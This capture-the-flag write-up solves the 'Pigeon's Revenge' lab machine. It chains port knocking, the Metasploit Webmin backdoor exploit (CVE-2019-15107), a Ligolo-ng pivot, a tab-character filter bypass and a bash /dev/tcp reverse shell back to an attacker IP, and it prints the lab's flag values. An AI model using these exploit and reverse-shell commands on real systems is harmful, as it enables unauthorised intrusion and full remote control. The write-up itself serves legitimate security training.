# Pigeon's Revenge — ACL Labs

![](https://img.shields.io/badge/Platform-ACLabs.pro-blue?style=for-the-badge)
![](https://img.shields.io/badge/Difficulty-Medium%2FHard-orange?style=for-the-badge)
![](https://img.shields.io/badge/OS-Linux-informational?style=for-the-badge&logo=linux&logoColor=white)
![](https://img.shields.io/badge/Category-Web%20%7C%20Forensics%20%7C%20PrivEsc-orange?style=for-the-badge)
<img width="1919" height="887" alt="PigeonsRevenge_aclabs pro" src="https://github.com/user-attachments/assets/d33edb98-4834-4a86-a275-89ccafef1886" />

## Summary

Pigeon's Revenge is a **Medium/Hard** multi-stage Linux machine involving three flags across different layers. The journey starts with a single open port serving a themed web page. Metadata hidden in a video file reveals a port knocking sequence that unlocks Webmin 1.910 on port 10000. An unauthenticated backdoor RCE (CVE-2019-15107) grants root inside a Docker container (**Flag 1**). Pivoting through the container with Ligolo-ng exposes the Docker host, where SSH access as `sparrow` is obtained using credentials from the challenge lore (**Flag 2**). Finally, a custom SUID binary with a character filter is bypassed using tab injection to escalate to root on the host (**Flag 3**).

```
Recon → Video Metadata (exiftool) → Port Knocking → Webmin Backdoor RCE → Container Root (Flag 1)
  → Ligolo-ng Pivot → SSH as sparrow (Flag 2) → Filter Bypass PrivEsc (Flag 3)
```

## Reconnaissance

### Nmap

```bash
sudo nmap -sC -sV -v 10.10.10.215
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx
|_http-title: Борис Голубь — LiveJournal
| http-methods:
|_  Supported Methods: GET HEAD
```

A single open port — nginx on 80. Nothing else exposed. Let's see what Boris the Pigeon has to say.

### Web Enumeration

<img width="1919" height="887" alt="Сайт Бориса Голубя" src="https://github.com/user-attachments/assets/5f700f5c-a8f3-4c47-af23-a73b90c96a06" />


The landing page is a themed blog belonging to Boris — a bitter carrier pigeon whose girlfriend Katya left him for a sparrow named Sparrow. The page features a video and a "Revenge Plan" tab. Other tabs are non-functional, and the source code holds nothing of interest.

Directory fuzzing for 5 minutes yielded no results, so the "Revenge Plan" is clearly our intended path. The plan mentions brute-forcing passwords, Python scripting, and — crucially — **"knocking on doors."** This strongly hints at port knocking.

### Video Metadata — The Hidden Clue

The landing page video can be downloaded as an `.mp4` file. Running `exiftool` reveals a hint buried in the metadata:

```bash
exiftool video.mp4
```

```
Description: Sparrow nest door code blyat' 2 8 10
```

The knock sequence is **2, 8, 10**.

### Port Knocking

Using `nmap` with the `-Pn` flag to knock on the three ports in sequence:

```bash
sudo nmap -Pn -p 2,8,10 10.10.10.215
```

After knocking three times, a fresh scan reveals the unlocked service:

```bash
sudo nmap -Pn -sV -v 10.10.10.215
```

```
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
```

Webmin 1.910 is now exposed on port 10000. Important note: Webmin requires HTTPS — navigating via plain HTTP will just show a redirect message that leads nowhere.

<img width="1919" height="887" alt="Борис Голубь порт 10000" src="https://github.com/user-attachments/assets/98a73f82-2983-4a11-9228-5a9a6c809749" />


## Exploitation

### Flag 1 — Webmin Backdoor RCE (CVE-2019-15107)

The passwords from the "Revenge Plan" don't work against the Webmin login. However, Webmin 1.910 is vulnerable to a well-known unauthenticated backdoor in `password_change.cgi`.

<img width="1200" height="724" alt="Борис Голубь webmin metasploit" src="https://github.com/user-attachments/assets/a66bbf4d-16f4-4d91-9bcb-7a1c5ade2c56" />


The `exploit/linux/http/webmin_backdoor` module requires no credentials — exactly what we need.

```bash
msf6> use exploit/linux/http/webmin_backdoor
msf6 exploit(linux/http/webmin_backdoor)> set rhosts 10.10.10.215
msf6 exploit(linux/http/webmin_backdoor)> set ssl true
msf6 exploit(linux/http/webmin_backdoor)> set lhost tun0
msf6 exploit(linux/http/webmin_backdoor)> set srvhost tun0
msf6 exploit(linux/http/webmin_backdoor)> run
```

```
[*] Started reverse TCP handler on 10.20.10.3:4444
[+] The target is vulnerable.
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.20.10.3:4444 -> 10.10.10.215:50008)

id
uid=0(root) gid=0(root) groups=0(root)
```

> **Critical setting:** `set ssl true` is mandatory here. Webmin on this box only accepts HTTPS connections — without this option the exploit silently fails.

We're root, but inside a Docker container (confirmed by the network interface `172.18.0.2/16`). First flag:

```bash
cat /flag1
flag_73b93510202e14edfc2d07087c2052d4
```

### Container Escape — Pivoting to the Docker Host

Checking root's bash history reveals a breadcrumb:

```bash
cat /root/.bash_history
```

```
ssh sparrow@172.18.0.1
fuck yeah
```

The user `sparrow` connected to the Docker host at `172.18.0.1` from inside the container. We need to make that network reachable from our attacking machine.

#### Ligolo-ng Tunnel Setup

On the attacker machine, start the proxy:

```bash
sudo ligolo-proxy -selfcert
```

Transfer the Ligolo agent to the container and run it:

```bash
./ligolo-ng_agent_0.8.3_linux_amd64 -ignore-cert -connect 10.20.10.4:11601
```

Once the agent connects, configure the route:

```
ligolo-ng » session
? Specify a session : 1 - root@c14c20cf8e71 - 10.10.10.215:36806
[Agent : root@c14c20cf8e71] » autoroute
? Select routes to add: 172.18.0.2/16
? Create a new interface or use an existing one? Create a new interface
? Enter interface name: pigon
? Start the tunnel? Yes
INFO[0532] Starting tunnel to root@c14c20cf8e71
```

The `172.18.0.0/16` network is now routable from our Kali box.

### Flag 2 — SSH as Sparrow

```bash
ssh sparrow@172.18.0.1
```

The connection works. The "Revenge Plan" mentioned that Sparrow is lazy and never changes his passwords. After trying the passwords listed in the challenge lore, `KatyaMyQueen` grants access.

```bash
sparrow@sparrow:~$ cat flag2
flag_8c3f96a510d78385bd8b8223bdfc17d2
```

## Privilege Escalation

### Flag 3 — Custom Binary Filter Bypass

The first thing to check on any compromised box:

```bash
sudo -l
```

```
User sparrow may run the following commands on sparrow:
    (root) SETENV: NOPASSWD: /usr/bin/pigeon_root --crumbs /root/root
```

A custom binary that runs as root with no password, and — critically — with `SETENV` permission, meaning we can pass environment variables through `sudo`.

Running it without context gives a hint:

```bash
sudo /usr/bin/pigeon_root --crumbs /root/root
No seeds provided, only vodka. Nothing to do.
```

#### Reverse Engineering with Ghidra

<img width="1919" height="964" alt="ghidra_pigeon_root" src="https://github.com/user-attachments/assets/5159a45c-8192-4f31-8a5e-773bf9bd3fbc" />


Pulling the binary to Kali via `scp` and analyzing it in Ghidra reveals the logic:

1. The binary reads the `PIGEON_SEEDS` environment variable.
2. If empty or unset, it prints the "vodka" message and exits.
3. It runs a **character filter** that replaces dangerous characters with underscores:
   ```c
   pcVar2 = strchr(";|&`$()<>!\\{}\' '",(int)*local_10);
   if (pcVar2 != (char *)0x0) {
       *local_10 = '_';
   }
   ```
4. The filtered string is passed to `system()` via `sh -c`.

Testing confirms the filter in action — spaces get replaced with underscores:

```bash
sparrow@sparrow:~$ export PIGEON_SEEDS="ls -la"
sparrow@sparrow:~$ ./pigeon_root
Original input : ls -la
After filter   : ls_-la
Executing: sh -c "ls_-la"
sh: 1: ls_-la: not found
```

Single-word commands work fine:

```bash
export PIGEON_SEEDS="id"
./pigeon_root
Executing: sh -c "id"
uid=1000(sparrow) gid=1000(sparrow) ...
```

The challenge: we need to execute `cat /root/root`, but the space character gets killed by the filter.

#### Method 1 — Tab Character Injection (Quick Read)

The filter blocks spaces but **doesn't block tab characters** (`\t`), which `sh` treats as a valid whitespace delimiter:

```bash
sudo PIGEON_SEEDS=$'cat\t/root/root' /usr/bin/pigeon_root --crumbs /root/root
```

```
Original input : cat    /root/root
After filter   : cat    /root/root
Executing: sh -c "cat   /root/root"
flag_670a6e9beba41ca37d61b295a5ae06c4
```

This works if you already know the flag's exact path and filename. If not — there's a better way.

#### Method 2 — Reverse Shell Script (Full Root)

Create a simple bash reverse shell script on the target:

```bash
cat > /tmp/script.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.20.10.4/4444 0>&1
EOF
chmod +x /tmp/script.sh
```

Start a listener on the attacker machine, then execute:

```bash
sudo PIGEON_SEEDS='/tmp/script.sh' /usr/bin/pigeon_root --crumbs /root/root
```

```bash
nc -vlnp 4444
listening on [any] 4444 ...
connect to [10.20.10.4] from (UNKNOWN) [10.10.10.215] 60664
root@sparrow:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@sparrow:/tmp# cat /root/root
flag_670a6e9beba41ca37d61b295a5ae06c4
```

Since the script path contains no spaces or filtered characters, it passes the filter untouched and executes as root — giving us a fully interactive root shell.

## Lessons Learned

1. **Always inspect media file metadata.** The port knocking sequence was hidden in the video's EXIF data. Tools like `exiftool` and `mediainfo` should be part of your standard recon workflow — especially when other enumeration paths hit dead ends.

2. **Port knocking can hide entire attack surfaces.** A clean nmap scan showed only port 80. Without the knock sequence, the Webmin instance on port 10000 was completely invisible. If a challenge hints at "knocking" or "doors," think port knocking immediately.

3. **Container root ≠ host root.** Getting root inside a Docker container is only half the battle. Always check network interfaces, bash history, and environment variables for breadcrumbs that reveal the next pivot point.

4. **Character filters that miss tab are surprisingly common.** The `pigeon_root` binary filtered spaces, semicolons, pipes, and most shell metacharacters — but forgot about `\t`. In real-world scenarios, IFS manipulation and tab injection are go-to techniques for bypassing naive input sanitization.

5. **`SETENV` in sudoers is a privilege escalation goldmine.** When `sudo` allows setting environment variables, any binary that reads from `getenv()` and passes the result to `system()` becomes a trivial escalation vector — regardless of how aggressive its input filter is.

---

*Writeup by [@alfabuster](https://github.com/alfabuster)*
